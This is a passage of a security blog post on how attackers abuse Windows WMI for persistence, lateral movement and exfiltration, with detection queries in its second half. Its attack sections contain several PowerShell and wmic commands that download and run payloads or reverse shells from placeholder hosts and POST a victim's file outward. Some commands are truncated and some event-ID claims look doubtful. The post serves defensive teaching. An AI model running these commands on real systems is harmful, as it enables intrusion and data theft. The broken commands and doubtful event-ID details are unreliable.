is: Attackers use WMI to create scheduled tasks that ensure malicious payloads are executed at specific times or events, such as system reboot or user logon. How it works: WMI schedules tasks that trigger malicious scripts or binaries at system startup or user logon. Example: An attacker creates a scheduled task using WMI that runs a malicious PowerShell script every time a user logs on to the system. Command: $task = [wmiclass]&quot;\\\\localhost\\root\\cimv2:Win32_ScheduledJob&quot; $task.Create(&quot;powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-WebRequest &#39;http://malicious-url.com/payload.ps1&#39; -OutFile &#39;C:\\Windows\\Temp\\payload.ps1&#39;; Start-Process &#39;C:\\Windows\\Temp\\payload.ps1&#39;&quot;) WMI for Remote Code Execution (RCE) What it is: Attackers use WMI to remotely execute arbitrary code on another system without requiring traditional administrative access. How it works: WMI allows attackers to trigger remote execution of code, bypassing traditional defenses like firewalls and remote access tools. Example: An attacker remotely runs a malicious executable or PowerShell script using WMI. Command: Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList &quot;cmd.exe /c http://malicious-url.com/malware.exe WMI Event Filters for Data Exfiltration What it is: Attackers use WMI event filters to capture system or user data and send it to an external server for exfiltration. How it works: WMI event subscriptions are set up to monitor system events (e.g., file creation) and send sensitive data to an attacker-controlled server. Example: An attacker sets up a WMI event subscription to trigger on file creation and then sends a copy of sensitive files to an external server. Command: $eventFilter = [wmiclass]&quot;\\\\localhost\\root\\cimv2:__EventFilter&quot; $eventConsumer = [wmiclass]&quot;\\\\localhost\\root\\cimv2:__EventConsumer&quot; $action = &quot;powershell.exe -Command Invoke-WebRequest -Uri &#39;http://malicious-url.com/upload&#39; -Method POST -Body (Get-Content &#39;C:\\Users\\victim\\Documents\\important.txt&#39;)&quot; WMI for Manipulating Services (Persistence) What it is: Attackers use WMI to create or manipulate services that ensure persistence or further exploitation on the compromised system. How it works: WMI can be used to create new services or manipulate existing ones, allowing attackers to execute malicious code on system startup or other specified conditions. Example: An attacker uses WMI to create a new service that runs a malicious payload each time the system starts. Command: $service = Get-WmiObject -Class Win32_Service -Filter &quot;Name=&#39;MyMaliciousService&#39;&quot; $service.Create(&quot;C:\\Windows\\Temp\\payload.exe&quot;, &quot;MaliciousService&quot;, &quot;auto&quot;, &quot;localSystem&quot;, &quot;C:\\Windows\\Temp\\payload.exe&quot;) WMI for Creating Backdoor Network Connections What it is: Attackers use WMI to create network connections that serve as backdoors for remote access. How it works: WMI can be used to initiate network connections, allowing attackers to maintain control of the compromised system or exfiltrate data. Example: An attacker uses WMI to invoke commands that create network connections to attacker-controlled servers. Command: Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList &quot;cmd.exe /c start [http://attacker-controlled-url.com/reverse-shell.ex](http://attacker-controlled-url.com/reverse-shell.exe)e WMI for Credential Dumping (Lateral Movement) What it is: Attackers use WMI to gather and exfiltrate credentials or password hashes from compromised systems to facilitate lateral movement. How it works: WMI scripts are used to extract credentials, password hashes, or other sensitive data from systems. Example: An attacker uses WMI to dump credentials from the Windows SAM or LSASS memory. Command: Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList &quot;powershell.exe -Command Invoke-WebRequest &#39;http://malicious-url.com/exfiltrate-credentials.ps1&#39; -OutFile &#39;C:\\Windows\\Temp\\credentials.ps1&#39;&quot; WMI to Modify Registry Keys (Persistence) What it is: Attackers use WMI to modify registry keys to execute malicious payloads on system startup. How it works: WMI can be used to modify the Windows registry, ensuring malicious programs are run when the system boots up. Example: An attacker modifies a registry key via WMI to run a malicious application on system startup. Commannd: Invoke-WmiMethod -Class Win32_Registry -Name Create -ArgumentList &quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot;, &quot;MyMaliciousApp&quot;, &quot;C:\\Windows\\Temp\\payload.exe&quot; WMI for Triggering Malicious PowerShell Scripts What it is: Attackers use WMI to remotely execute malicious PowerShell scripts, which are often used to download additional tools or payloads. How it works: PowerShell scripts can be invoked via WMI as part of the attack chain to download and execute malicious code. Example: An attacker uses WMI to invoke a PowerShell script that downloads additional tools from an external server. Command: Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList &quot;powershell.exe -ExecutionPolicy Bypass WMI for Rootkit Installation (Persistence) Explanation: Attackers leverage WMI to install rootkits or alter system components to maintain control and avoid detection, often evading traditional security tools. Detection: Event ID 4688: Monitors process creation, including those associated with malicious rootkits. Event ID 7045: Tracks service installations, which could include services related to rootkits. Example Detection: Watch for process creation and service installation events related to rootkit files. Get-WinEvent -LogName &quot;System&quot; | Where-Object { $_.Id -eq 7045 -and $_.Message -like &quot;*rootkit*&quot; } Rationale: Rootkits installed via WMI are stealthy. Monitoring for new processes and services associated with rootkit behavior can help identify this persistence technique. Lets Move TO The Detection Part WMI for Modifying Event Logs (Evading Detection) Explanation: Attackers use WMI to modify, delete, or suppress event logs to cover up their actions, making it harder to trace their activities. Detection: Event ID 19: Tracks the modification of WMI event subscriptions, which might be used to hide log alterations. Event ID 10: Monitors WMI command execution, including potential log modification actions. Example Detection: Correlate WMI execution events with any suspicious log deletions or modifications. Get-WinEvent -LogName &quot;Security&quot; | Where-Object { $_.Id -eq 19 } Rationale: Modifying event logs through WMI can be a strong indication of an attacker trying to cover their tracks. Monitoring for WMI-related modifications helps detect this technique. WMI Event Subscription (Persistence) Explanation: WMI event subscriptions are used by attackers to establish a backdoor on a system. These subscriptions can trigger malicious actions when certain system events occur. Detection: Event ID 19: Indicates the creation or modification of WMI event subscriptions. Event ID 10: Logs WMI executions, often linked to scripts or processes that are triggered by event subscriptions. Example Detection: Monitor for event subscription creation and WMI execution, especially when tied to system events. Get-WinEvent -LogName &quot;Security&quot; | Where-Object { $_.Id -eq 19 } Rationale: Persistent backdoors created via WMI event subscriptions can survive reboots. Tracking these events helps detect unauthorized persistence mechanisms. WMI Remote Execution (Lateral Movement) Explanation: WMI is often used for remote command execution across the network, allowing attackers to move laterally without triggering traditional remote administration tools. Detection: Event ID 4688: Monitors process creation, which includes remote executions via WMI. Event ID 4648: Detects logon attempts that use explicit credentials, signaling potential lateral movement. Example Detection: Watch for the execution of wmic or PowerShell, which can indicate WMI-based lateral movement. Get-WinEvent -LogName &quot;Security&quot; | Where-Object { $_.Id -eq 4688 -and $_.Message -like &quot;*wmic*&quot; } Rationale: Remote execution and lateral movement using WMI can bypass traditional security defenses. Monitoring for these events can reveal suspicious lateral activity across the network. WMI as a Backdoor (Persistence) Explanation: WMI can be used to establish a persistent backdoor, which can survive system reboots. Attackers might install malicious scripts or binaries that are triggered by certain system events. Detection: Event ID 4688: Tracks process creation, which may reveal WMI-based backdoor executables. Event ID 7045: Monitors service installations, which may include malicious services created through WMI for persistence. Example Detection: Investigate new processes or services that might indicate a backdoor established via WMI. Get-WinEvent -LogName &quot;System&quot; | Where-Object { $_.Id -eq 7045 -and $_.Message -like &quot;*maliciousservice*&quot; } Rationale: Backdoors set up using WMI can persist even after a reboot. Service creation and process execution tied to WMI commands help detect backdoor persistence. WMI for Pivoting (Lateral Movement) Explanation: WMI is a useful tool for pivoting across the network, allowing attackers to move between systems without relying on traditional remote administration tools like RDP. Detection: Event ID 4688: Detects suspicious process execution, especially when WMI-related commands like wmic are invoked remotely. Event ID 4648: Monitors logon events, particularly those indicating credential use for lateral movement. Example Detection: Correlate remote execution events with unusual logon attempts or suspicious processes. Get-WinEvent -LogName &quot;Security&quot; | Where-Object { $_.Id -eq 4688 -and $_.Message -like &quot;*wmic*&quot; } Rationale: Pivoting via WMI can be harder to detect than using traditional tools. Monitoring for WMI executions across the network and correlating logon events is essential for identifying lateral movement. WMI Scheduled Task Creation (Persistence) Explanation: WMI can create or modify scheduled tasks that persist even through system reboots, allowing attackers to execute malicious scripts or binaries on a regular basis. Detection: Event ID 4697: Logs the installation of services that could be associated with scheduled task creation. Event ID 10: Tracks WMI executions that might relate to scheduled task creation or manipulation. Example Detection: Watch for task creation events and any associated WMI-based execution that may signal scheduled tasks for persistence. Get-WinEvent -LogName &quot;Security&quot; | Where-Object { $_.Id -eq 4697 } Rationale: Scheduled tasks created via WMI allow attackers to run scripts persistently. Monitoring these events can reveal persistence mechanisms set by attackers. WMI for Remote Code Execution (RCE) Explanation: WMI can be leveraged to execute arbitrary code remotely, enabling attackers to bypass security controls and run commands without needing direct access to the system. Detection: Event ID 4688: Monitors process creation for remote code execution via WMI (e.g., PowerShell, wmic). Event ID 10: Tracks WMI command executions that could indicate remote code execution. Example Detection: Correlate suspicious remote code execution events through WMI with unusual network activity or file modifications. Get-WinEvent -LogName &quot;Security&quot; | Where-Object { $_.Id -eq 4688 -and $_.Message -like &quot;*powershell.exe*&quot; } Rationale: Remote code execution via WMI bypasses traditional defenses. Monitoring for this kind of activity can help detect malicious use of WMI for arbitrary code execution. WMI Event Filters for Data Exfiltration Explanation: Event filters can be used by attackers to monitor system activity and exfiltrate data, such as sending logs or files to an external server. Detection: Event ID 10: Logs WMI execution, which might indicate data exfiltration-related actions. Event ID 19: Detects the creation of WMI event filters, which could be set up to capture and send system data. Example Detection: Investigate WMI event filters and correlate them with network traffic indicating potential data exfiltration. Get-WinEvent -LogName &quot;Security&quot; | Where-Object { $_.Id -eq 10 } Rationale: Data exfiltration via WMI event filters can be stealthy. Monitoring these events alongside network traffic can help detect such attacks. WMI for Manipulating Services (Persistence) Explanation: Attackers may use WMI to manipulate or install services that provide persistence on a system or escalate privileges. Detection: Event ID 7045: Service creation or modification, potentially related to malicious services installed via WMI. Event ID 4688: Tracks the execution of commands related to service manipulation through WMI. Example Detection: Monitor for the creation or modification of services and correlating WMI command executions. Get-WinEvent -LogName &quot;System&quot; | Where-Object { $_.Id -eq 7045 -and $_.Message -like &quot;*maliciousservice*&quot; } Rationale: WMI is a versatile tool for manipulating services. Monitoring for service installations and WMI execution can help detect attackers establishing persistence via services. WMI for Triggering Malicious PowerShell Scripts Explanation: Attackers often use WMI to trigger malicious PowerShell scripts that can perform actions like downloading malware or exfiltrating data. Detection: Event ID 4688: Tracks the creation of processes, particularly PowerShell or suspicious scripts triggered via WMI. Event ID 4104: PowerShell script block logging, which can reveal the contents of malicious scripts. Example Detection: Correlate PowerShell execution events with suspicious network activity or file modifications to detect malicious scripts triggered by WMI. Get-WinEvent -LogName &quot;Security&quot; | Where-Object { $_.Id -eq 4688 -and $_.Message -like &quot;*powershell.exe*&quot; } Rationale: PowerShell is commonly used for malicious purposes in WMI-based attacks. Monitoring PowerShell executions and script block logging can help detect such malicious activities.","headline":"How the attacker abuses WMI","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/2025/05/02/How-the-attacker-abuses-WMI/"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://0.0.0.0:4000/logo.png"},"name":"Ahmed Khalifa"},"url":"http://0.0.0.0:4000/2025/05/02/How-the-attacker-abuses-WMI/"}</script>
+  <!-- End Jekyll SEO tag -->
+  <link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/feed.xml" title="Ahmed Khalifa" />
+</head>
+
+
+<body>
+
+  <div class="container pure-g">
+    <div class="sidebar-left pure-u-1 pure-u-md-1-4">
+      <header class="masthead">
+        <div class="avatar"><img src="/avatar.jpeg" class="avatar-image" alt="Ahmed Khalifa">
+        </div>
+        <div class="masthead-title">
+          <a href="/" title="Home">Ahmed Khalifa</a>
+        </div>
+        <div class="masthead-tagline">
+          <small>Threat Researcher & DFIR Engineer interested in Adversary Hunting and malware Research</small>
+        </div>
+        <nav class="navigation">
+          <ul class="navigation-list">
+            <li class="navigation-item">
+              <a onclick="sessionStorage.setItem('forceCheckScroll', 'true')" href="/">Blog</a>
+            </li>
+            <li class="navigation-item">
+              <a onclick="sessionStorage.setItem('forceCheckScroll', 'true')"
+                href="https://kh4lifa0x.github.io/about_me/">About</a>
+            </li>
+          </ul>
+        </nav>
+        <div class="social pure-menu pure-menu-horizontal">
+          <ul class="social-icons pure-menu-list">
+            <li class="pure-menu-item">
+              <a class="social-icon pure-menu-link" href="mailto://ahmedkhalifa8474hh@gmail.com">
+                <i class="fas fa-envelope" title="Email"></i>
+              </a>
+            </li>
+            <li class="pure-menu-item">
+              <a class="social-icon pure-menu-link" href="https://x.com/svchostss_exe">
+                <i class="fab fa-twitter" title="Twitter"></i>
+              </a>
+            </li>
+            <li class="pure-menu-item">
+              <a class="social-icon pure-menu-link" href="https://github.com/kh4lifa0x">
+                <i class="fab fa-github" title="GitHub"></i>
+              </a>
+            </li>
+          </ul>
+        </div>
+      </header>
+    </div>
+
+    <div class="content pure-u-1 pure-u-md-1-2">
+      <main>
+        <article class="post">
+          <h1 class="post-title">How the attacker abuses WMI</h1>
+          <div class="post-meta"><time datetime="2025-05-02T10:32:00+03:00" itemprop="datePublished">2 May 2025</time>
+          </div>
+
+          <h1 id="wmi-event-subscription-persistence">WMI Event Subscription (Persistence)</h1>
+
+          <p><strong>What it is</strong>: Attackers create WMI event subscriptions to execute malicious actions based on
+            system events, like startup or user logon, ensuring persistence.</p>
+
+          <p><strong>How it works</strong>:</p>
+
+          <ul>
+            <li>Attackers create <code class="language-plaintext highlighter-rouge">__EventFilter</code> and <code
+                class="language-plaintext highlighter-rouge">__EventConsumer</code> to trigger actions when system
+              events occur.</li>
+          </ul>
+
+          <p><strong>Example</strong>:</p>
+
+          <ul>
+            <li>An attacker can create an event filter using WMI to execute a PowerShell script upon system startup,
+              maintaining persistence even after reboots.</li>
+            <li><strong>Command</strong>:</li>
+            <li><code
+                class="language-plaintext highlighter-rouge">$filter = [wmiclass]"\\localhost\root\cimv2:__EventFilter" $consumer = [wmiclass]"\\localhost\root\cimv2:__EventConsumer" $action = "powershell.exe -ExecutionPolicy Bypass -NoLogo -NoProfile -WindowStyle Hidden -Command Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious-url.com/payload.ps1')"</code>
+            </li>
+          </ul>
+
+          <h1 id="wmi-remote-execution-lateral-movement">WMI Remote Execution (Lateral Movement)</h1>
+
+          <p><strong>What it is</strong>: Attackers use WMI to execute commands remotely on other systems, facilitating
+            lateral movement across the network without needing traditional remote access protocols.</p>
+
+          <p><strong>How it works</strong>:</p>
+
+          <ul>
+            <li>Tools like <code class="language-plaintext highlighter-rouge">wmic</code> or PowerShell’s <code
+                class="language-plaintext highlighter-rouge">Invoke-WmiMethod</code> execute commands remotely on other
+              systems within the network.</li>
+          </ul>
+
+          <p><strong>Example</strong>:</p>
+
+          <ul>
+            <li>An attacker uses <code class="language-plaintext highlighter-rouge">wmic</code> to execute a command on
+              a remote system that downloads and executes a malicious payload.</li>
+            <li><strong>Command</strong>:</li>
+          </ul>
+
+          <p><code
+              class="language-plaintext highlighter-rouge">wmic /node:TargetSystem process call create "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-WebRequest 'http://malicious-url.com/payload.exe' -OutFile 'C:\Windows\Temp\payload.exe'; Start-Process 'C:\Windows\Temp\payload.exe'</code>
+          </p>
+
+          <h1 id="wmi-as-a-backdoor-persistence">WMI as a Backdoor (Persistence)</h1>
+
+          <p><strong>What it is</strong>: Attackers install a backdoor via WMI to maintain control over the compromised
+            system even after reboots.</p>
+
+          <p><strong>How it works</strong>:</p>
+
+          <ul>
+            <li>WMI is used to execute commands remotely, typically opening a reverse shell or enabling further
+              exploitation.</li>
+          </ul>
+
+          <p><strong>Example</strong>:</p>
+
+          <ul>
+            <li>An attacker uses WMI to execute a PowerShell script that opens a reverse shell back to the attacker’s
+              server.</li>
+            <li><strong>Command</strong>:</li>
+            <li><code
+                class="language-plaintext highlighter-rouge">Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell.exe -Command Invoke-WebRequest 'http://malicious-url.com/reverse-shell.ps1' -OutFile 'C:\Windows\Temp\reverse-shell.ps1'; C:\Windows\Temp\reverse-shell.ps1"</code>
+            </li>
+          </ul>
+
+          <h1 id="wmi-for-pivoting-lateral-movement">WMI for Pivoting (Lateral Movement)</h1>
+
+          <p><strong>What it is</strong>: After compromising one system, attackers use WMI to move laterally to other
+            systems, expanding the attack footprint across the network.</p>
+
+          <p><strong>How it works</strong>:</p>
+
+          <ul>
+            <li>Attackers leverage WMI to execute commands on additional systems, further escalating privileges and
+              spreading across the network.</li>
+          </ul>
+
+          <p><strong>Example</strong>:</p>
+
+          <ul>
+            <li>An attacker uses WMI to run commands on a target machine to download and execute malware from a remote
+              server.</li>
+            <li><strong>Command</strong>:</li>
+          </ul>
+
+          <p><code
+              class="language-plaintext highlighter-rouge">wmic /node:TargetSystem process call create "powershell.exe -Command Invoke-WebRequest 'http://malicious-url.com/malware.exe' -OutFile 'C:\Windows\Temp\malware.exe'; Start-Process 'C:\Windows\Temp\malware.exe'"</code>
+          </p>
+
+          <h1 id="wmi-scheduled-task-creation-persistence">WMI Scheduled Task Creation (Persistence)</h1>
+
+          <p><strong>What it is</strong>: Attackers use WMI to create scheduled tasks that ensure malicious payloads are
+            executed at specific times or events, such as system reboot or user logon.</p>
+
+          <p><strong>How it works</strong>:</p>
+
+          <ul>
+            <li>WMI schedules tasks that trigger malicious scripts or binaries at system startup or user logon.</li>
+          </ul>
+
+          <p><strong>Example</strong>:</p>
+
+          <ul>
+            <li>An attacker creates a scheduled task using WMI that runs a malicious PowerShell script every time a user
+              logs on to the system.</li>
+            <li><strong>Command</strong>:</li>
+            <li><code
+                class="language-plaintext highlighter-rouge">$task = [wmiclass]"\\localhost\root\cimv2:Win32_ScheduledJob" $task.Create("powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-WebRequest 'http://malicious-url.com/payload.ps1' -OutFile 'C:\Windows\Temp\payload.ps1'; Start-Process 'C:\Windows\Temp\payload.ps1'")</code>
+            </li>
+          </ul>
+
+          <h1 id="wmi-for-remote-code-execution-rce">WMI for Remote Code Execution (RCE)</h1>
+
+          <p><strong>What it is</strong>: Attackers use WMI to remotely execute arbitrary code on another system without
+            requiring traditional administrative access.</p>
+
+          <p><strong>How it works</strong>:</p>
+
+          <ul>
+            <li>WMI allows attackers to trigger remote execution of code, bypassing traditional defenses like firewalls
+              and remote access tools.</li>
+          </ul>
+
+          <p><strong>Example</strong>:</p>
+
+          <ul>
+            <li>An attacker remotely runs a malicious executable or PowerShell script using WMI.</li>
+            <li><strong>Command</strong>:</li>
+            <li><code
+                class="language-plaintext highlighter-rouge">Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c http://malicious-url.com/malware.exe</code>
+            </li>
+          </ul>
+
+          <h1 id="wmi-event-filters-for-data-exfiltration">WMI Event Filters for Data Exfiltration</h1>
+
+          <p><strong>What it is</strong>: Attackers use WMI event filters to capture system or user data and send it to
+            an external server for exfiltration.</p>
+
+          <p><strong>How it works</strong>:</p>
+
+          <ul>
+            <li>WMI event subscriptions are set up to monitor system events (e.g., file creation) and send sensitive
+              data to an attacker-controlled server.</li>
+          </ul>
+
+          <p><strong>Example</strong>:</p>
+
+          <ul>
+            <li>An attacker sets up a WMI event subscription to trigger on file creation and then sends a copy of
+              sensitive files to an external server.</li>
+            <li><strong>Command</strong>:</li>
+          </ul>
+
+          <p><code
+              class="language-plaintext highlighter-rouge">$eventFilter = [wmiclass]"\\localhost\root\cimv2:__EventFilter" $eventConsumer = [wmiclass]"\\localhost\root\cimv2:__EventConsumer" $action = "powershell.exe -Command Invoke-WebRequest -Uri 'http://malicious-url.com/upload' -Method POST -Body (Get-Content 'C:\Users\victim\Documents\important.txt')"</code>
+          </p>
+
+          <h1 id="wmi-for-manipulating-services-persistence">WMI for Manipulating Services (Persistence)</h1>
+
+          <p><strong>What it is</strong>: Attackers use WMI to create or manipulate services that ensure persistence or
+            further exploitation on the compromised system.</p>
+
+          <p><strong>How it works</strong>:</p>
+
+          <ul>
+            <li>WMI can be used to create new services or manipulate existing ones, allowing attackers to execute
+              malicious code on system startup or other specified conditions.</li>
+          </ul>
+
+          <p><strong>Example</strong>:</p>
+
+          <ul>
+            <li>An attacker uses WMI to create a new service that runs a malicious payload each time the system starts.
+            </li>
+            <li><strong>Command</strong>:</li>
+            <li><code
+                class="language-plaintext highlighter-rouge">$service = Get-WmiObject -Class Win32_Service -Filter "Name='MyMaliciousService'" $service.Create("C:\Windows\Temp\payload.exe", "MaliciousService", "auto", "localSystem", "C:\Windows\Temp\payload.exe")</code>
+            </li>
+          </ul>
+
+          <h1 id="wmi-for-creating-backdoor-network-connections">WMI for Creating Backdoor Network Connections</h1>
+
+          <p><strong>What it is</strong>: Attackers use WMI to create network connections that serve as backdoors for
+            remote access.</p>
+
+          <p><strong>How it works</strong>:</p>
+
+          <ul>
+            <li>WMI can be used to initiate network connections, allowing attackers to maintain control of the
+              compromised system or exfiltrate data.</li>
+          </ul>
+
+          <p><strong>Example</strong>:</p>
+
+          <ul>
+            <li>An attacker uses WMI to invoke commands that create network connections to attacker-controlled servers.
+            </li>
+            <li><strong>Command</strong>:</li>
+            <li><code
+                class="language-plaintext highlighter-rouge">Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c start  [http://attacker-controlled-url.com/reverse-shell.ex](http://attacker-controlled-url.com/reverse-shell.exe)e</code>
+            </li>
+          </ul>
+
+          <h1 id="wmi-for-credential-dumping-lateral-movement">WMI for Credential Dumping (Lateral Movement)</h1>
+
+          <p><strong>What it is</strong>: Attackers use WMI to gather and exfiltrate credentials or password hashes from
+            compromised systems to facilitate lateral movement.</p>
+
+          <p><strong>How it works</strong>:</p>
+
+          <ul>
+            <li>WMI scripts are used to extract credentials, password hashes, or other sensitive data from systems.</li>
+          </ul>
+
+          <p><strong>Example</strong>:</p>
+
+          <ul>
+            <li>An attacker uses WMI to dump credentials from the Windows SAM or LSASS memory.</li>
+            <li><strong>Command</strong>:</li>
+            <li><code
+                class="language-plaintext highlighter-rouge">Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell.exe -Command Invoke-WebRequest 'http://malicious-url.com/exfiltrate-credentials.ps1' -OutFile 'C:\Windows\Temp\credentials.ps1'"</code>
+            </li>
+          </ul>
+
+          <h1 id="wmi-to-modify-registry-keys-persistence">WMI to Modify Registry Keys (Persistence)</h1>
+
+          <p><strong>What it is</strong>: Attackers use WMI to modify registry keys to execute malicious payloads on
+            system startup.</p>
+
+          <p><strong>How it works</strong>:</p>
+
+          <ul>
+            <li>WMI can be used to modify the Windows registry, ensuring malicious programs are run when the system
+              boots up.</li>
+          </ul>
+
+          <p><strong>Example</strong>:</p>
+
+          <ul>
+            <li>An attacker modifies a registry key via WMI to run a malicious application on system startup.</li>
+            <li><strong>Commannd:</strong></li>
+            <li><code
+                class="language-plaintext highlighter-rouge">Invoke-WmiMethod -Class Win32_Registry -Name Create -ArgumentList "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "MyMaliciousApp", "C:\Windows\Temp\payload.exe"</code>
+            </li>
+          </ul>
+
+          <h1 id="wmi-for-triggering-malicious-powershell-scripts">WMI for Triggering Malicious PowerShell Scripts</h1>
+
+          <p><strong>What it is</strong>: Attackers use WMI to remotely execute malicious PowerShell scripts, which are
+            often used to download additional tools or payloads.</p>
+
+          <p><strong>How it works</strong>:</p>
+
+          <ul>
+            <li>PowerShell scripts can be invoked via WMI as part of the attack chain to download and execute malicious
+              code.</li>
+          </ul>
+
+          <p><strong>Example</strong>:</p>
+
+          <ul>
+            <li>An attacker uses WMI to invoke a PowerShell script that downloads additional tools from an external
+              server.</li>
+            <li><strong>Command</strong>:</li>
+            <li><code
+                class="language-plaintext highlighter-rouge">Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell.exe -ExecutionPolicy Bypass</code>
+            </li>
+          </ul>
+
+          <h1 id="wmi-for-rootkit-installation-persistence">WMI for Rootkit Installation (Persistence)</h1>
+
+          <p><strong>Explanation</strong>: Attackers leverage WMI to install rootkits or alter system components to
+            maintain control and avoid detection, often evading traditional security tools.</p>
+
+          <p><strong>Detection</strong>:</p>
+
+          <ul>
+            <li><strong>Event ID 4688</strong>: Monitors process creation, including those associated with malicious
+              rootkits.</li>
+            <li><strong>Event ID 7045</strong>: Tracks service installations, which could include services related to
+              rootkits.</li>
+          </ul>
+
+          <p><strong>Example Detection</strong>:</p>
+
+          <ul>
+            <li>Watch for process creation and service installation events related to rootkit files.</li>
+          </ul>
+
+          <p><code
+              class="language-plaintext highlighter-rouge">Get-WinEvent -LogName "System" | Where-Object { $_.Id -eq 7045 -and $_.Message -like "*rootkit*" }</code>
+          </p>
+
+          <p><strong>Rationale</strong>: Rootkits installed via WMI are stealthy. Monitoring for new processes and
+            services associated with rootkit behavior can help identify this persistence technique.</p>
+
+          <h1 id="lets-move-to-the-detection-part">Lets Move TO The Detection Part</h1>
+
+          <h1 id="wmi-for-modifying-event-logs-evading-detection">WMI for Modifying Event Logs (Evading Detection)</h1>
+
+          <p><strong>Explanation</strong>: Attackers use WMI to modify, delete, or suppress event logs to cover up their
+            actions, making it harder to trace their activities.</p>
+
+          <p><strong>Detection</strong>:</p>
+
+          <ul>
+            <li><strong>Event ID 19</strong>: Tracks the modification of WMI event subscriptions, which might be used to
+              hide log alterations.</li>
+            <li><strong>Event ID 10</strong>: Monitors WMI command execution, including potential log modification
+              actions.</li>
+          </ul>
+
+          <p><strong>Example Detection</strong>:</p>
+
+          <ul>
+            <li>Correlate WMI execution events with any suspicious log deletions or modifications.</li>
+          </ul>
+
+          <p><code
+              class="language-plaintext highlighter-rouge">Get-WinEvent -LogName "Security" | Where-Object { $_.Id -eq 19 }</code>
+          </p>
+
+          <p><strong>Rationale</strong>: Modifying event logs through WMI can be a strong indication of an attacker
+            trying to cover their tracks. Monitoring for WMI-related modifications helps detect this technique.</p>
+
+          <h1 id="wmi-event-subscription-persistence-1">WMI Event Subscription (Persistence)</h1>
+
+          <p><strong>Explanation</strong>: WMI event subscriptions are used by attackers to establish a backdoor on a
+            system. These subscriptions can trigger malicious actions when certain system events occur.</p>
+
+          <p><strong>Detection</strong>:</p>
+
+          <ul>
+            <li><strong>Event ID 19</strong>: Indicates the creation or modification of WMI event subscriptions.</li>
+            <li><strong>Event ID 10</strong>: Logs WMI executions, often linked to scripts or processes that are
+              triggered by event subscriptions.</li>
+          </ul>
+
+          <p><strong>Example Detection</strong>:</p>
+
+          <ul>
+            <li>Monitor for event subscription creation and WMI execution, especially when tied to system events.</li>
+          </ul>
+
+          <p><code
+              class="language-plaintext highlighter-rouge">Get-WinEvent -LogName "Security" | Where-Object { $_.Id -eq 19 }</code>
+          </p>
+
+          <p><strong>Rationale</strong>: Persistent backdoors created via WMI event subscriptions can survive reboots.
+            Tracking these events helps detect unauthorized persistence mechanisms.</p>
+
+          <h1 id="wmi-remote-execution-lateral-movement-1">WMI Remote Execution (Lateral Movement)</h1>
+
+          <p><strong>Explanation</strong>: WMI is often used for remote command execution across the network, allowing
+            attackers to move laterally without triggering traditional remote administration tools.</p>
+
+          <p><strong>Detection</strong>:</p>
+
+          <ul>
+            <li><strong>Event ID 4688</strong>: Monitors process creation, which includes remote executions via WMI.
+            </li>
+            <li><strong>Event ID 4648</strong>: Detects logon attempts that use explicit credentials, signaling
+              potential lateral movement.</li>
+          </ul>
+
+          <p><strong>Example Detection</strong>:</p>
+
+          <ul>
+            <li>Watch for the execution of <code class="language-plaintext highlighter-rouge">wmic</code> or PowerShell,
+              which can indicate WMI-based lateral movement.</li>
+          </ul>
+
+          <p><code
+              class="language-plaintext highlighter-rouge">Get-WinEvent -LogName "Security" | Where-Object { $_.Id -eq 4688 -and $_.Message -like "*wmic*" }</code>
+          </p>
+
+          <p><strong>Rationale</strong>: Remote execution and lateral movement using WMI can bypass traditional security
+            defenses. Monitoring for these events can reveal suspicious lateral activity across the network.</p>
+
+          <h1 id="wmi-as-a-backdoor-persistence-1">WMI as a Backdoor (Persistence)</h1>
+
+          <p><strong>Explanation</strong>: WMI can be used to establish a persistent backdoor, which can survive system
+            reboots. Attackers might install malicious scripts or binaries that are triggered by certain system events.
+          </p>
+
+          <p><strong>Detection</strong>:</p>
+
+          <ul>
+            <li><strong>Event ID 4688</strong>: Tracks process creation, which may reveal WMI-based backdoor
+              executables.</li>
+            <li><strong>Event ID 7045</strong>: Monitors service installations, which may include malicious services
+              created through WMI for persistence.</li>
+          </ul>
+
+          <p><strong>Example Detection</strong>:</p>
+
+          <ul>
+            <li>Investigate new processes or services that might indicate a backdoor established via WMI.</li>
+          </ul>
+
+          <p><code
+              class="language-plaintext highlighter-rouge">Get-WinEvent -LogName "System" | Where-Object { $_.Id -eq 7045 -and $_.Message -like "*maliciousservice*" }</code>
+          </p>
+
+          <p><strong>Rationale</strong>: Backdoors set up using WMI can persist even after a reboot. Service creation
+            and process execution tied to WMI commands help detect backdoor persistence.</p>
+
+          <h1 id="wmi-for-pivoting-lateral-movement-1">WMI for Pivoting (Lateral Movement)</h1>
+
+          <p><strong>Explanation</strong>: WMI is a useful tool for pivoting across the network, allowing attackers to
+            move between systems without relying on traditional remote administration tools like RDP.</p>
+
+          <p><strong>Detection</strong>:</p>
+
+          <ul>
+            <li><strong>Event ID 4688</strong>: Detects suspicious process execution, especially when WMI-related
+              commands like <code class="language-plaintext highlighter-rouge">wmic</code> are invoked remotely.</li>
+            <li><strong>Event ID 4648</strong>: Monitors logon events, particularly those indicating credential use for
+              lateral movement.</li>
+          </ul>
+
+          <p><strong>Example Detection</strong>:</p>
+
+          <ul>
+            <li>Correlate remote execution events with unusual logon attempts or suspicious processes.</li>
+          </ul>
+
+          <p><code
+              class="language-plaintext highlighter-rouge">Get-WinEvent -LogName "Security" | Where-Object { $_.Id -eq 4688 -and $_.Message -like "*wmic*" }</code>
+          </p>
+
+          <p><strong>Rationale</strong>: Pivoting via WMI can be harder to detect than using traditional tools.
